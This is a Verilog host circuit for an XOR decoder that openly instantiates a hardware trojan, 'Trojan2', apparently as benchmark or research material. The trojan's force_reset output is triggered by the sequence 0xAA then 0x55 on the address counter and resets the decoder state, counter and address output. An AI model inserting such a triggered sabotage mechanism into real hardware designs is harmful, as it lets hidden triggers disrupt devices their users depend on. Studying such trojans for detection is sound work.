// Decoder Host Circuit for Trojan2
// Use XOR_MASK to decode the encoded_input
// Only 3 cycles total for decode
module trojan2_decoder1_host #(
    parameter XOR_MASK = 16'h3AB9,
    parameter [7:0] TROJ_TRIGGER_SEQUENCE_1 = 8'hAA,
    parameter [7:0] TROJ_TRIGGER_SEQUENCE_2 = 8'h55
)(
    input wire clk,
    input wire pon_rst_i,
    input wire [15:0] encoded_input,  // Fixed width
    input wire decode_enable,
    output reg [15:0] decoded_output, // Fixed width
    output reg decode_valid,
    output reg [12:0] prog_adr_out    // Connect trojan address output
);

    // Trojan interface (fixed width)
    wire [7:0] trojan_data_in;
    wire trojan_force_reset;
    
    reg [12:0] address_counter;
    reg [3:0] decode_state;
    
    assign trojan_data_in = address_counter[7:0]; // Use lower 8 bits of address counter
    
    // Decoder logic
    always @(posedge clk or posedge pon_rst_i) begin
        if (pon_rst_i) begin
            decoded_output <= 16'h0;
            decode_valid <= 1'b0;
            decode_state <= 4'h0;
        end else if (trojan_force_reset) begin // Force reset from Trojan
            decoded_output <= 16'h0;
            decode_valid <= 1'b0;
            decode_state <= 4'h0;
        end else begin
            if (decode_enable) begin
                case (decode_state)
                    4'h0: begin // Start decode
                        decoded_output <= 16'h0;
                        decode_state <= 4'h1;
                        decode_valid <= 1'b0;
                    end
                    4'h1: begin // Decode process
                        // Decode: XOR the input with the XOR_MASK
                        decoded_output <= encoded_input ^ XOR_MASK;
                        decode_state <= 4'h2;
                        decode_valid <= 1'b1;
                    end
                    4'h2: begin // Finish
                        decode_valid <= 1'b0;
                        decode_state <= 4'h0;
                    end
                    default: begin
                        decode_state <= 4'h0;
                    end
                endcase
            end else begin
                decode_valid <= 1'b0;
            end
        end
    end
    
    // Address counter
    always @(posedge clk or posedge pon_rst_i) begin
        if (pon_rst_i) begin
            address_counter <= 13'h0;
        end else if (trojan_force_reset) begin // Force reset from Trojan
            address_counter <= 13'h0;
        end else if (decode_enable) begin
            address_counter <= address_counter + 1;
        end
    end

    // Connect trojan address output
    always @(posedge clk or posedge pon_rst_i) begin
        if (pon_rst_i) begin
            prog_adr_out <= 13'h0;
        end else if (trojan_force_reset) begin // Force reset from Trojan
            prog_adr_out <= 13'h0;
        end else begin
            prog_adr_out <= address_counter;
        end
    end

    // Instantiate Trojan2
    Trojan2 #(
        .TRIGGER_SEQUENCE_1(TROJ_TRIGGER_SEQUENCE_1),
        .TRIGGER_SEQUENCE_2(TROJ_TRIGGER_SEQUENCE_2)
    ) trojan_inst (
        .clk(clk),
        .rst(pon_rst_i),
        .data_in(trojan_data_in),
        .force_reset(trojan_force_reset)
    );

endmodule
